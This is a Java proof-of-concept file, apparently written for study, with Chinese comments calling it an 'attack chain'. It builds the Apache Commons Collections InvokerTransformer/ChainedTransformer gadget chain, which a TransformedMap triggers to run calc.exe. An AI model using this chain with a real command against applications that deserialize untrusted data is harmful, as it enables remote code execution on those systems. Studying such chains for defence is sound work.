import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class thertry {
    public static void main(String[] args) {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc.exe"})};

//首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap
        Transformer chain = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        innerMap.put("2", "1");
//传入我们构造好的chain攻击链
        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
        outerMap.put("dsds", "23");

    }
}
